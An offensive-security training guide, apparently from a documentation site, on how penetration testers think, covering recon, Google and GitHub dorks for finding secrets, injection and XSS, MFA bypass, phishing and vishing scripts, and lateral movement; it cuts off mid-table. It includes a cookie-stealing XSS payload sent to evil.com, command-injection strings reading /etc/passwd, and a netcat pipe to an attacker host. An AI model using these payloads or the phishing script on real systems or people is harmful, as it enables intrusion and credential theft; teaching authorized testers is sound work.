---
title: Ethical Hacker (Offensive) Mindset — Think Like an Attacker
description: Developing an offensive security mindset  how real hackers think, approach targets, chain vulnerabilities, and stay ten steps ahead. Philosophy, methodology, psychology, and the technical brilliance behind every breach.
navigation:
  icon: i-lucide-brain
  title: Offensive Mindset
---

Tools do not make a hacker. **Mindset does.**

Anyone can download Kali Linux, run `msfconsole`, and press buttons. But the difference between a script kiddie who fires exploits at random and a professional operator who silently compromises an entire enterprise in 72 hours comes down to one thing — **how they think**.

This guide is not about tools. This guide is about rewiring your brain to see systems the way attackers do — every input is a doorway, every trust boundary is a target, every assumption is a vulnerability waiting to be exploited.

::note
This guide is written for **authorized security professionals** — penetration testers, red teamers, bug bounty hunters, and security researchers. The mindset described here should only be applied within legal and ethical boundaries. The goal is to **break things so they can be fixed**, not to cause harm.
::

## The Core Philosophy

Before a single packet leaves your machine, you need to internalize these truths.

::card-group
  ::card
  ---
  title: Everything is Hackable
  icon: i-lucide-unlock
  ---
  There is no such thing as a perfectly secure system. Every piece of software, hardware, and protocol was built by humans — and humans make mistakes. Your job is to find those mistakes before someone with bad intentions does.
  ::

  ::card
  ---
  title: Defenders Must Be Right 100% of the Time
  icon: i-lucide-shield
  ---
  Attackers only need to be right **once**. A defender must protect every port, every service, every user, every configuration, every dependency. You only need to find one weakness in the entire chain.
  ::

  ::card
  ---
  title: The Weakest Link Wins
  icon: i-lucide-link-2-off
  ---
  A $10 million firewall means nothing if the CEO's password is `Company2024!` or the intern has admin access to production. Humans are always the weakest link.
  ::

  ::card
  ---
  title: Complexity is the Enemy of Security
  icon: i-lucide-puzzle
  ---
  The more complex a system, the more attack surface it has. Every feature is a potential vulnerability. Every integration is a trust boundary. Every line of code is a chance for a bug.
  ::
::

### The Hacker's Creed

::callout{icon="i-lucide-quote"}
_"I do not break into systems to destroy. I break into systems to reveal what is already broken — the false sense of security, the unpatched vulnerability, the password written on a sticky note. I am the fire drill that tests whether the building actually burns."_
::

## The Five Laws of Offensive Thinking

These are not suggestions. These are laws. Violate them and you will fail — or worse, get caught doing something you should not be doing.

::steps{level="3"}

### Law 1 — Enumerate Everything

The number one mistake junior pentesters make is **not enumerating enough**. They find one open port, fire an exploit, fail, and declare the system secure.

A real attacker enumerates until they run out of things to enumerate. Then they enumerate again.

::accordion
  :::accordion-item{icon="i-lucide-search" label="What 'Enumerate Everything' actually means"}
  - Every IP address in the scope
  - Every port on every IP (all 65,535, not just the top 1,000)
  - Every service running on every port
  - Every version number of every service
  - Every web directory, file, and parameter
  - Every username, email address, and naming convention
  - Every subdomain, DNS record, and certificate
  - Every technology stack, framework, and library
  - Every default credential for every discovered technology
  - Every error message, header, and response code
  - Every trust relationship between systems
  - Every piece of publicly available information about the target
  :::

  :::accordion-item{icon="i-lucide-lightbulb" label="The 80/20 Rule of Hacking"}
  **80% of your time should be spent on reconnaissance and enumeration.** Only 20% should be spent on exploitation.

  Script kiddies do the opposite — they spend 5 minutes scanning and 5 hours throwing random exploits. Professionals spend 5 hours mapping the entire attack surface and 5 minutes executing a precisely targeted attack.

  The best exploits feel anticlimactic. "That's it? That's all it took?" Yes. Because the preparation was where the real work happened.
  :::
::

### Law 2 — Question Every Assumption

Every system is built on assumptions. Your job is to find them and prove them wrong.

| Assumption the Defender Makes | How the Attacker Exploits It |
| ----------------------------- | ---------------------------- |
| "Nobody would try that input" | SQL injection, XSS, command injection |
| "Internal network is safe" | Lateral movement after phishing |
| "This port is not exposed" | Port scanning reveals forgotten services |
| "Our password policy is strong" | Password spraying with seasonal patterns |
| "SSL means we are secure" | Certificate pinning bypass, MITM with rogue CA |
| "This API is internal only" | SSRF, DNS rebinding, exposed Swagger docs |
| "Nobody knows this URL exists" | Directory brute forcing, Google dorking, Wayback Machine |
| "Two-factor is unbreakable" | SIM swapping, push fatigue, session hijacking |
| "We patched everything" | Zero-days, misconfigurations, logic flaws |
| "Our vendor handles security" | Supply chain attacks, default credentials |

::tip
Every time you hear _"nobody would ever do that"_ or _"that would never happen"_, your hacker brain should light up. Those are the exact places where vulnerabilities hide — in the blind spots of assumptions.
::

### Law 3 — Think in Attack Chains

Individual vulnerabilities are interesting. **Chained vulnerabilities are devastating.**

A low-severity information disclosure + a medium-severity SSRF + a low-severity misconfiguration can combine into a critical remote code execution chain that compromises the entire infrastructure.

::callout{icon="i-lucide-link"}
_"The art of hacking is not finding one door — it is finding the sequence of doors that leads from the parking lot to the vault."_
::

```text [Attack Chain Example]
Step 1: Information Disclosure (Low)
  └─ Exposed .git directory reveals source code
      └─ Source code contains internal API endpoints

Step 2: SSRF via Internal API (Medium)
  └─ Internal API allows requests to metadata service
      └─ Cloud metadata returns IAM credentials

Step 3: IAM Credential Abuse (Critical)
  └─ Stolen IAM role has S3 full access
      └─ S3 bucket contains database backups
          └─ Database backup contains all user credentials
              └─ Admin credentials grant access to production
                  └─ Full infrastructure compromise

Individual severities: Low → Medium → Critical
Combined impact: CATASTROPHIC
```

::warning
Bug bounty hunters who master attack chaining earn 10x more than those who submit isolated findings. A $200 information disclosure becomes a $20,000 critical when chained properly.
::

### Law 4 — Document Everything in Real Time

Your memory is unreliable. Your terminal history is incomplete. If you did not document it, it did not happen.


  ::card
  ---
  title: Screenshots
  icon: i-lucide-camera
  ---
  Screenshot **everything** — before, during, and after exploitation. Include timestamps, IP addresses, and the full terminal output. A screenshot of a popped shell is worth a thousand words in a report.
  ::

  ::card
  ---
  title: Terminal Logging
  icon: i-lucide-scroll-text
  ---
  Use `script session.log` or `tee` to capture every command and output. Metasploit's `spool` command. Burp Suite's project files. Never rely on scrollback.
  ::

  ::card
  ---
  title: Attack Narrative
  icon: i-lucide-book-open
  ---
  Write the story as it happens. "At 14:32 UTC, I discovered port 8443 running Jenkins 2.289. Checked for CVE-2024-23897, confirmed vulnerable. Extracted /etc/passwd via arbitrary file read." This becomes your report.
  ::

  ::card
  ---
  title: Evidence Integrity
  icon: i-lucide-fingerprint
  ---
  Hash your evidence files. `sha256sum screenshot.png >> evidence_hashes.txt`. If your findings are ever questioned, cryptographic proof of integrity matters — especially in legal contexts.
::


### Law 5 — Know When to Stop

The most dangerous moment in a penetration test is when you get excited. You pop a shell, adrenaline hits, and suddenly you are exploring systems that are out of scope, dumping data you should not be reading, or accidentally breaking production.

::caution
**The scope document is your Bible.** If a system is out of scope, it does not exist. If an action is not authorized, it does not happen. The moment you step outside scope, you transition from ethical hacker to criminal. There is no gray area.
::

| Situation | Right Action | Wrong Action |
| --------- | ------------ | ------------ |
| Found creds for out-of-scope system | Document and report. Do not use them. | "Let me just check if they work..." |
| Discovered PII / sensitive data | Stop reading. Document the finding. Report it. | Screenshot the actual data |
| Production system showing instability | Stop testing immediately. Notify the client. | Keep going, it is probably fine |
| Found a vulnerability in a third-party | Report to client. Let them coordinate with vendor. | Exploit the third-party directly |
| Time is running out, no findings yet | Report honestly. Not every test finds critical vulns. | Make findings sound worse than they are |

::

## The Attacker's Methodology

Every professional engagement follows a methodology. Freelancing without structure leads to missed vulnerabilities and inconsistent results.

### The Kill Chain

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Overview"}
  ```text [The Cyber Kill Chain]
  ┌─────────────────────────────────────────────────────────────┐
  │                    THE KILL CHAIN                           │
  │                                                             │
  │  ┌──────────────┐                                          │
  │  │ 1. RECON     │  ← Gather intelligence                  │
  │  └──────┬───────┘                                          │
  │         ▼                                                   │
  │  ┌──────────────┐                                          │
  │  │ 2. WEAPONIZE │  ← Build the attack                     │
  │  └──────┬───────┘                                          │
  │         ▼                                                   │
  │  ┌──────────────┐                                          │
  │  │ 3. DELIVER   │  ← Get it to the target                 │
  │  └──────┬───────┘                                          │
  │         ▼                                                   │
  │  ┌──────────────┐                                          │
  │  │ 4. EXPLOIT   │  ← Trigger the vulnerability            │
  │  └──────┬───────┘                                          │
  │         ▼                                                   │
  │  ┌──────────────┐                                          │
  │  │ 5. INSTALL   │  ← Establish persistence                │
  │  └──────┬───────┘                                          │
  │         ▼                                                   │
  │  ┌──────────────┐                                          │
  │  │ 6. C2        │  ← Command & control channel            │
  │  └──────┬───────┘                                          │
  │         ▼                                                   │
  │  ┌──────────────┐                                          │
  │  │ 7. ACTIONS   │  ← Achieve objectives                   │
  │  └──────────────┘                                          │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="Detailed Phases"}
  | Phase | Name | Objective | Attacker Mindset |
  | ----- | ---- | --------- | ---------------- |
  | 1 | **Reconnaissance** | Map the target completely | "What does the surface look like?" |
  | 2 | **Weaponization** | Craft exploit + payload | "What weapon fits this lock?" |
  | 3 | **Delivery** | Get the weapon to the target | "How do I get inside the door?" |
  | 4 | **Exploitation** | Trigger the vulnerability | "Pull the trigger" |
  | 5 | **Installation** | Establish persistence | "Make sure I can come back" |
  | 6 | **Command & Control** | Maintain communication | "Keep the line open" |
  | 7 | **Actions on Objectives** | Achieve the mission goal | "Take what I came for" |
  :::
::

### Reconnaissance Mindset

Recon is not just running Nmap. Recon is becoming **obsessed** with understanding your target.

#### Passive Recon — Leave No Trace

Passive recon never touches the target directly. You are a ghost.

::accordion
  :::accordion-item{icon="i-lucide-globe" label="OSINT (Open Source Intelligence)"}
  | Source | What You Find | Why It Matters |
  | ------ | ------------- | -------------- |
  | LinkedIn | Employee names, roles, tech stack, org structure | Usernames, phishing targets, technology mapping |
  | GitHub | Source code, API keys, credentials, internal URLs | Direct access or vulnerability discovery |
  | Shodan / Censys | Internet-facing services, banners, certificates | Attack surface mapping without scanning |
  | Google Dorking | Exposed files, admin panels, error pages | Low-hanging fruit that nobody realizes is public |
  | Wayback Machine | Old versions of the website, removed pages | Historical endpoints that still work |
  | DNS records | Subdomains, mail servers, cloud providers | Infrastructure mapping |
  | Certificate Transparency | All SSL certificates ever issued for a domain | Subdomain discovery, internal hostnames |
  | Job postings | Technology stack, tools, security maturity | "We use Kubernetes, Jenkins, and AWS" = attack roadmap |
  | Social media | Personal info, work photos (whiteboards!), locations | Social engineering material |
  | Data breaches | Previously leaked credentials | Credential stuffing attacks |
  | SEC filings / Annual reports | Subsidiaries, acquisitions, IT spending | Scope expansion, merger-related misconfigurations |
  | Pastebin / GitHub Gists | Leaked configs, credentials, internal docs | Direct access or intelligence |
  :::

  :::accordion-item{icon="i-lucide-search" label="Google Dorking Masterclass"}
  ```text [Essential Google Dorks]
  # Find exposed admin panels
  site:target.com inurl:admin
  site:target.com inurl:login
  site:target.com intitle:"dashboard"

  # Find exposed files
  site:target.com filetype:pdf
  site:target.com filetype:xlsx
  site:target.com filetype:sql
  site:target.com filetype:env
  site:target.com filetype:log
  site:target.com filetype:conf
  site:target.com filetype:bak

  # Find exposed directories
  site:target.com intitle:"index of" 
  site:target.com intitle:"directory listing"

  # Find error messages (information disclosure)
  site:target.com "sql syntax" 
  site:target.com "warning: mysql"
  site:target.com "stack trace"
  site:target.com "fatal error"

  # Find credentials
  site:target.com inurl:password
  site:target.com "api_key" OR "apikey" OR "api key"
  site:target.com "BEGIN RSA PRIVATE KEY"

  # Find subdomains and related infrastructure
  site:*.target.com -www
  site:target.com inurl:staging OR inurl:dev OR inurl:test

  # Find WordPress specifics
  site:target.com inurl:wp-content
  site:target.com inurl:wp-json
  site:target.com inurl:xmlrpc.php
  ```

  ::tip
  Google indexes things that should not be indexed. That WordPress debug log from 2019 that was accidentally made public? Still cached. That staging environment with default credentials? Google found it before you did.
  ::
  :::

  :::accordion-item{icon="i-lucide-git-branch" label="GitHub Recon — The Gold Mine"}
  ```text [GitHub Search Queries]
  # Search for secrets in target's repos
  org:target-company password
  org:target-company secret
  org:target-company api_key
  org:target-company "BEGIN RSA PRIVATE KEY"
  org:target-company AWS_ACCESS_KEY
  org:target-company jdbc:mysql://

  # Search for internal URLs
  org:target-company "internal" OR "staging" OR "dev"
  org:target-company "10.0." OR "172.16." OR "192.168."

  # Search employee personal repos
  # (employees often copy work code to personal repos)
  "target-company" password filename:.env
  "target.com" filename:config.yml
  ```

  Tools to automate this:

  ```bash [Terminal]
  # TruffleHog — scan for secrets in git history
  trufflehog github --org=target-company

  # GitDorker — automated GitHub dorking
  python3 GitDorker.py -t YOUR_TOKEN -org target-company

  # gitleaks — scan repos for secrets
  gitleaks detect --source=/path/to/repo
  ```
  :::
::

#### Active Recon — Touching the Target

Active recon involves direct interaction with the target. You are now visible in their logs.

::tip
The moment you send a SYN packet to a target, you leave a trace. Your IP is in their firewall logs. Your User-Agent is in their web server logs. Your DNS queries are in their resolver logs. Act accordingly.
::

::field-group
  ::field{name="Port Scanning" type="technique"}
  Map every open port. Use `-p-` to scan all 65,535. The service running on port 49152 that nobody knows about is often the one that gets you in.
  ::

  ::field{name="Service Fingerprinting" type="technique"}
  Version numbers are vulnerability identifiers. `Apache 2.4.49` tells you to check for path traversal (CVE-2021-41773). `OpenSSH 7.2` tells you to check for user enumeration.
  ::

  ::field{name="Web Application Mapping" type="technique"}
  Every endpoint, parameter, header, and cookie is an attack vector. Map the entire application before testing anything. Use Burp Suite's spider, then manually explore what the spider missed.
  ::

  ::field{name="DNS Enumeration" type="technique"}
  Subdomains reveal forgotten infrastructure. `staging.target.com`, `dev-api.target.com`, `old.target.com` — these are often less protected than production.
  ::

  ::field{name="Technology Stack Identification" type="technique"}
  Knowing the stack tells you what to attack. Wappalyzer, WhatWeb, response headers, error messages — every piece of technology has known vulnerabilities.
  ::
::

## Vulnerability Classes — The Attacker's Perspective

Understanding vulnerability classes from the attacker's perspective is fundamentally different from understanding them from a textbook.

### Input Validation Failures

::callout{icon="i-lucide-text-cursor-input"}
_"If the application accepts my input, the application trusts me. And trust is a vulnerability."_
::

Every input field, URL parameter, HTTP header, cookie value, file upload, and API parameter is a potential injection point. The attacker's question is always: **"What happens if I put something unexpected here?"**

::tabs
  :::tabs-item{icon="i-lucide-database" label="SQL Injection Mindset"}
  The developer thinks: _"The user will type their username."_

  The attacker thinks: _"The user input goes into a SQL query. What if I **become** the query?"_

  ```text [The Mental Model]
  Developer's expectation:
    SELECT * FROM users WHERE username = 'admin'

  Attacker's reality:
    SELECT * FROM users WHERE username = '' OR '1'='1'-- -'
                                              ^^^^^^^^^^
                                              I am the query now.
  ```

  **The mindset shift:** Stop seeing input fields as text boxes. Start seeing them as **SQL query editors**.

  | What the developer sees | What the attacker sees |
  | ----------------------- | ---------------------- |
  | Login form | SQL query injection point |
  | Search bar | Potential UNION-based data extraction |
  | URL parameter `?id=1` | Blind SQL injection via time-based responses |
  | Cookie value | Second-order SQL injection vector |
  | HTTP header (User-Agent, Referer) | Logged and later processed — stored injection |
  | JSON API body | NoSQL injection if MongoDB backend |
  :::

  :::tabs-item{icon="i-lucide-code" label="Command Injection Mindset"}
  The developer thinks: _"The user will type a hostname to ping."_

  The attacker thinks: _"My input is concatenated into a shell command. I **am** the shell now."_

  ```text [The Mental Model]
  Developer's expectation:
    ping -c 4 google.com

  Attacker's reality:
    ping -c 4 ; whoami ; cat /etc/passwd #
                ^^^^^^^^^^^^^^^^^^^^^^^^
                I control the operating system.
  ```

  **Characters that break context:**

  | Character | What it does | Example |
  | --------- | ------------ | ------- |
  | `;` | Command separator | `; whoami` |
  | `&&` | Execute if previous succeeds | `&& cat /etc/passwd` |
  | `\|\|` | Execute if previous fails | `\|\| id` |
  | `` ` `` | Command substitution | `` `whoami` `` |
  | `$()` | Command substitution | `$(id)` |
  | `\|` | Pipe output | `\| nc attacker 4444` |
  | `\n` / `%0a` | Newline injection | `%0aid` |
  :::

  :::tabs-item{icon="i-lucide-globe" label="XSS Mindset"}
  The developer thinks: _"The user will type their name."_

  The attacker thinks: _"My input is reflected in HTML. I can inject **executable code** into every visitor's browser."_

  ```text [The Mental Model]
  Developer's expectation:
    <p>Hello, John!</p>

  Attacker's reality:
    <p>Hello, <script>document.location='https://evil.com/?c='+document.cookie</script>!</p>
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                Every visitor's session is now mine.
  ```

  **The three types of XSS thinking:**

  | Type | Attacker's Question | Impact |
  | ---- | ------------------- | ------ |
  | Reflected | "Is my input echoed back in the response?" | One-time attack via crafted URL |
  | Stored | "Is my input saved and displayed to others?" | Persistent attack affecting all visitors |
  | DOM-based | "Does JavaScript process my input unsafely?" | Client-side attack, harder to detect |
  :::
::

### Authentication & Session Failures

::callout{icon="i-lucide-key-round"}
_"I don't need to break down the door if I can clone the key — or if the door was never locked in the first place."_
::

::accordion
  :::accordion-item{icon="i-lucide-key" label="Password Attack Mindset"}
  Before brute forcing, ask yourself these questions:

  1. **Is there a default credential?** Check the technology, version, and vendor documentation. An embarrassing number of production systems still use `admin:admin`.

  2. **Is there a password policy?** If yes, craft your wordlist to match it. Minimum 8 characters with complexity? Your wordlist should be `Company2024!` not `password`.

  3. **Is there account lockout?** If yes, password spraying. If no, full brute force.

  4. **Is there a password reset flow?** Often weaker than the login itself. Security questions, email-based tokens, SMS codes — all attackable.

  5. **Is there credential reuse?** Check data breach databases. If `jsmith@target.com:Summer2023!` was in a LinkedIn breach, try `Summer2024!` on the corporate VPN.

  6. **Is there a registration page?** Create an account to understand the password requirements, then build a targeted wordlist.
  :::

  :::accordion-item{icon="i-lucide-cookie" label="Session Management Mindset"}
  | What the attacker asks | What they are looking for |
  | ---------------------- | ------------------------- |
  | "Is the session token predictable?" | Sequential IDs, timestamps, weak randomness |
  | "Is the token transmitted securely?" | Missing `Secure` flag, HTTP instead of HTTPS |
  | "Does the token expire?" | Sessions that last forever = stolen token lasts forever |
  | "Can I fixate the session?" | Setting a known session ID before authentication |
  | "Is there a logout function?" | Does it actually invalidate the server-side session? |
  | "Can I access another user's session?" | IDOR via session token manipulation |
  | "Is the JWT signed properly?" | `alg: none` attack, weak secret, key confusion |
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Multi-Factor Authentication Bypass Mindset"}
  MFA is not unbreakable. The attacker's thinking:

  | MFA Type | Attack Vector |
  | -------- | ------------- |
  | SMS code | SIM swapping, SS7 interception, social engineering the carrier |
  | Email code | Compromise the email account first |
  | TOTP app | Steal the seed (from backup, phishing, or device compromise) |
  | Push notification | Push fatigue — send 50 requests at 3 AM until they approve one |
  | Hardware key (FIDO2) | Extremely hard to bypass. Respect the hardware key. |
  | "Remember this device" | Steal the device cookie. Now you ARE the remembered device. |
  | Recovery codes | Often stored insecurely. Check if they are predictable. |
  :::
::

### Authorization & Logic Failures

::callout{icon="i-lucide-shield-alert"}
_"The most dangerous vulnerabilities are not technical — they are logical. The code works perfectly. It just does the wrong thing."_
::

These are the hardest bugs to find with automated tools and the most impactful when exploited.

::card-group
  ::card
  ---
  title: IDOR (Insecure Direct Object Reference)
  icon: i-lucide-replace
  ---
  Change `GET /api/user/1001/profile` to `GET /api/user/1002/profile`. If you see another user's data, you found an IDOR. Change `1002` to `1` and you probably have the admin.
  ::

  ::card
  ---
  title: Privilege Escalation (Horizontal)
  icon: i-lucide-arrow-right-left
  ---
  You are User A. Can you perform User B's actions? Change the user ID in the request, swap JWT tokens, or modify hidden form fields. The server trusts what the client sends.
  ::

  ::card
  ---
  title: Privilege Escalation (Vertical)
  icon: i-lucide-arrow-up
  ---
  You are a regular user. Can you access admin functionality? Try accessing `/admin`, changing `role=user` to `role=admin` in the request, or modifying JWT claims.
  ::

  ::card
  ---
  title: Business Logic Flaws
  icon: i-lucide-calculator
  ---
  Apply a discount code twice. Buy a negative quantity. Transfer money to yourself. Skip step 3 of 5 in a wizard. These are not code bugs — they are logic bugs. Scanners cannot find them.
  ::
::

::tabs
  :::tabs-item{icon="i-lucide-lightbulb" label="IDOR Hunting Mindset"}
  Every time you see an identifier in a request, ask:

  - **Can I change it?** (`/order/5001` → `/order/5002`)
  - **Can I enumerate it?** (IDs are sequential: `1001, 1002, 1003...`)
  - **Can I predict it?** (UUID v1 is time-based, not random)
  - **Is it checked server-side?** (The server says "your order" but does it verify ownership?)
  - **Does it work across endpoints?** (My user ID is checked on `/profile` but not on `/export`)

  **Where to look:**

  | Location | Example | Test |
  | -------- | ------- | ---- |
  | URL path | `/api/users/1001` | Change `1001` |
  | Query parameter | `?invoice_id=5001` | Change `5001` |
  | POST body | `{"user_id": 1001}` | Change `1001` |
  | Cookie | `user_id=1001` | Change `1001` |
  | HTTP header | `X-User-ID: 1001` | Change `1001` |
  | File path | `/files/user_1001/doc.pdf` | Change path |
  | WebSocket message | `{"target": 1001}` | Change target |
  :::

  :::tabs-item{icon="i-lucide-lightbulb" label="Logic Flaw Hunting Mindset"}
  Think about the **business process**, not the code:

  | Business Process | Logic Flaw to Test |
  | ---------------- | ------------------ |
  | E-commerce checkout | Modify price in request, apply coupon twice, negative quantity |
  | Money transfer | Transfer negative amount (receive money), race condition on balance |
  | Registration | Register as admin, bypass email verification, reuse verification token |
  | Password reset | Reset another user's password, reuse reset token, predictable token |
  | File upload | Upload `.php` as `.jpg`, path traversal in filename, overwrite existing files |
  | Multi-step process | Skip steps, go backwards, replay completed steps |
  | Rate limiting | Change IP header, use different API endpoints, change case |
  | Trial/subscription | Extend trial by re-registering, downgrade then access premium features |
  :::
::

## The Psychology of Social Engineering

::callout{icon="i-lucide-brain"}
_"The most sophisticated firewall in the world cannot protect against a human who clicks 'Enable Macros' because the email said their package is delayed."_
::

Social engineering is not about technology. It is about **human psychology** — specifically, exploiting cognitive biases and emotional triggers.

### The Six Principles of Influence

Based on Dr. Robert Cialdini's research — the same principles that marketers use to sell products, attackers use to steal credentials.

::card-group
  ::card
  ---
  title: 1. Authority
  icon: i-lucide-crown
  ---
  People obey authority figures without questioning. _"This is the IT department. We need your password to fix an urgent security issue."_ The victim complies because they perceive authority.
  ::

  ::card
  ---
  title: 2. Urgency
  icon: i-lucide-alarm-clock
  ---
  Time pressure overrides critical thinking. _"Your account will be suspended in 1 hour unless you verify your credentials."_ Panic leads to action without thought.
  ::

  ::card
  ---
  title: 3. Social Proof
  icon: i-lucide-users
  ---
  People follow the crowd. _"Your colleagues have already completed this security training. Click here to finish yours."_ Nobody wants to be the only one who hasn't complied.
  ::

  ::card
  ---
  title: 4. Reciprocity
  icon: i-lucide-gift
  ---
  People feel obligated to return favors. _"I helped you with that printer issue last week, right? Could you just hold the door for me? I forgot my badge."_ Tailgating via social debt.
  ::

  ::card
  ---
  title: 5. Liking
  icon: i-lucide-heart
  ---
  People say yes to people they like. Build rapport first. Chat about the weather, compliment their desk setup, find common ground. Then make your request.
  ::

  ::card
  ---
  title: 6. Scarcity
  icon: i-lucide-hourglass
  ---
  Limited availability creates urgency. _"Only the first 50 employees to register get the new company laptop. Click here now."_ Fear of missing out overrides caution.
  ::
::

### Phishing — The Attacker's Art

::tabs
  :::tabs-item{icon="i-lucide-mail" label="Email Phishing Mindset"}
  A good phishing email is indistinguishable from a legitimate one. The attacker thinks:

  | Element | Amateur Phishing | Professional Phishing |
  | ------- | ---------------- | --------------------- |
  | Sender | `security@g00gle.com` | `security@google.com` (spoofed or look-alike domain) |
  | Subject | `URGENT!!! CLICK NOW!!!` | `Action Required: Verify your identity for Q4 compliance` |
  | Body | Broken English, generic | Perfect grammar, personalized, references real projects |
  | Link | `http://evil.com/login` | `https://login.microsoftonline.com.evil.com/oauth2` |
  | Attachment | `invoice.exe` | `Q4_Budget_Review.xlsm` (macro-enabled, relevant to target) |
  | Timing | Random | Monday 9 AM (when people are rushing through emails) |
  | Pretext | "You won a prize" | "Your password expires in 24 hours" (IT policy exists) |
  :::

  :::tabs-item{icon="i-lucide-phone" label="Vishing (Voice) Mindset"}
  Phone-based social engineering is devastatingly effective because:

  - People are conditioned to be helpful on the phone
  - Caller ID can be spoofed trivially
  - There is no "hover over the link" equivalent for voice
  - Pressure is immediate and personal

  **The script framework:**

  1. **Establish identity:** _"Hi, this is Mike from the IT helpdesk."_
  2. **Create context:** _"We are migrating to the new system this weekend."_
  3. **Build urgency:** _"I need to verify your account before 5 PM or you'll lose access Monday."_
  4. **Make the request:** _"Can you confirm your current password so I can set up the migration?"_
  5. **Provide a safety net:** _"You'll receive a confirmation email after we're done."_ (They won't.)
  :::

  :::tabs-item{icon="i-lucide-usb" label="Physical Social Engineering"}
  | Technique | Description | Mindset |
  | --------- | ----------- | ------- |
  | Tailgating | Follow someone through a secure door | Look busy, carry boxes, be on a "phone call" |
  | USB drop | Leave malicious USBs in the parking lot | Label them "Executive Salary Review 2024" |
  | Impersonation | Pretend to be IT, delivery, or contractor | Wear a polo shirt and carry a clipboard |
  | Shoulder surfing | Watch someone type their password | Stand behind them in a "line" or sit behind them at a café |
  | Dumpster diving | Search trash for sensitive documents | Companies throw away incredibly sensitive material |
  | Badge cloning | Copy RFID badge with a Proxmark | Stand near someone in an elevator for 3 seconds |
  :::
::

## Network Attack Mindset

### Think Like a Packet

::callout{icon="i-lucide-network"}
_"To attack a network, you must first understand how data flows through it. Every packet tells a story. Every protocol has assumptions. Every trust boundary is an opportunity."_
::

::accordion
  :::accordion-item{icon="i-lucide-layers" label="The OSI Model — Attacker's Perspective"}
  | Layer | Name | What the Attacker Thinks |
  | ----- | ---- | ------------------------ |
  | 7 | Application | "What web apps are running? What APIs? What input do they accept?" |
  | 6 | Presentation | "Is the data encrypted? Can I downgrade the encryption? Can I forge certificates?" |
  | 5 | Session | "Can I hijack the session? Can I predict session tokens?" |
  | 4 | Transport | "What ports are open? Can I do a SYN flood? Can I predict TCP sequence numbers?" |
  | 3 | Network | "Can I spoof IP addresses? Can I intercept routing? Can I pivot through subnets?" |
  | 2 | Data Link | "Can I ARP spoof? Can I do VLAN hopping? Can I sniff the local segment?" |
  | 1 | Physical | "Can I plug into a network jack? Can I tap a fiber cable? Can I jam the WiFi?" |

  **Key insight:** Defenses at one layer do not protect other layers. A perfectly configured firewall (Layer 3/4) does nothing against SQL injection (Layer 7). HTTPS (Layer 6) does nothing against ARP spoofing (Layer 2).
  :::

  :::accordion-item{icon="i-lucide-route" label="Man-in-the-Middle Thinking"}
  The MITM mindset: _"If I can position myself between two communicating parties, I can read, modify, or block everything they say to each other."_

  | Technique | Layer | How It Works |
  | --------- | ----- | ------------ |
  | ARP Spoofing | 2 | Tell the victim your MAC address belongs to the gateway |
  | DNS Spoofing | 7 | Tell the victim that `bank.com` resolves to your IP |
  | DHCP Spoofing | 3 | Become the DHCP server, assign yourself as the gateway |
  | BGP Hijacking | 3 | Announce the target's IP prefix from your router |
  | SSL Stripping | 6 | Downgrade HTTPS to HTTP transparently |
  | Rogue AP | 2 | Create a WiFi network named "CompanyWiFi" near the office |
  | IPv6 RA Attack | 3 | Send router advertisements to become the IPv6 gateway |
  :::

  :::accordion-item{icon="i-lucide-wifi" label="Wireless Attack Mindset"}
  WiFi networks broadcast their existence. They beg to be attacked.

  | Attack | Mindset |
  | ------ | ------- |
  | WPA2 Handshake Capture | "I just need one device to connect. Then I crack offline — forever." |
  | Evil Twin AP | "People auto-connect to known network names. I'll be 'Starbucks WiFi'." |
  | Deauth Attack | "I'll kick everyone off the real AP. When they reconnect, they connect to mine." |
  | PMKID Attack | "I don't even need a client. I can extract the hash from the AP itself." |
  | WPS Pin Attack | "8-digit PIN, but only 11,000 combinations due to a design flaw." |
  | Karma Attack | "My rogue AP responds to every probe request. Looking for 'HomeWiFi'? I'm HomeWiFi." |
  :::
::

### Lateral Movement Philosophy

::callout{icon="i-lucide-footprints"}
_"The first machine you compromise is never the target. It is the stepping stone. The real target is three hops deep in a network segment you cannot even see yet."_
::

```text [Lateral Movement Mental Map]
                         ┌─ You Are Here
                         ▼
┌────────────────────────────────────────────────────────────────┐
│  DMZ (Compromised Web Server)                                 │
│  ┌──────────┐                                                 │
│  │ Web App  │ ──── Pivot Point 1                              │
│  │ 10.0.1.5 │                                                 │
│  └────┬─────┘                                                 │
│       │ Internal NIC: 10.0.2.x                                │
├───────┼────────────────────────────────────────────────────────┤
│  Corporate Network                                             │
│       │                                                        │
│  ┌────▼─────┐    ┌──────────┐    ┌──────────┐                │
│  │ File Srv │    │ Email Srv│    │ Workstatn │                │
│  │ 10.0.2.10│────│ 10.0.2.20│────│ 10.0.2.30│                │
│  └──────────┘    └──────────┘    └────┬─────┘                │
│                                       │ Creds found            │
│                                       │ Domain Admin token     │
├───────────────────────────────────────┼────────────────────────┤
│  Server VLAN (Restricted)             │                        │
│                                  ┌────▼─────┐                 │
│  ┌──────────┐    ┌──────────┐   │   DC01   │                 │
│  │ Database │    │ Backup   │   │ 10.0.3.1 │ ← THE PRIZE    │
│  │ 10.0.3.50│    │ 10.0.3.60│   └──────────┘                 │
│  └──────────┘    └──────────┘                                 │
└────────────────────────────────────────────────────────────────┘
```

**The lateral movement mindset checklist:**

::field-group
  ::field{name="What credentials do I have?" type="question"}
  Passwords, hashes, Kerberos tickets, SSH keys, API tokens, session cookies. Every credential is a key to another door.
  ::

  ::field{name="What can I see from here?" type="question"}
  ARP table, routing table, DNS, shares, trust relationships. Map the network from the compromised host's perspective.
  ::

  ::field{name="What trusts this machine?" type="question"}
  Other servers that accept connections from this IP, shared credentials, service accounts, scheduled tasks that connect to other systems.
  ::

  ::field{name="What runs automatically?" type="question"}
  Cron jobs, scheduled tasks, startup scripts, service accounts. These often contain credentials or connect to other systems with elevated privileges.
  ::

  ::field{name="What is the path to Domain Admin?" type="question"}
  In Active Directory, the question is always: what is the shortest chain of credential reuse, delegation, or trust abuse that gets you to Domain Admin?
  ::
::

## Web Application Attack Mindset

### The OWASP Top 10 — Attacker's Interpretation

::tabs
  :::tabs-item{icon="i-lucide-list-ordered" label="How Attackers Read OWASP"}
  | OWASP Category | What the Defender Reads | What the Attacker Reads |
  | -------------- | ----------------------- | ----------------------- |
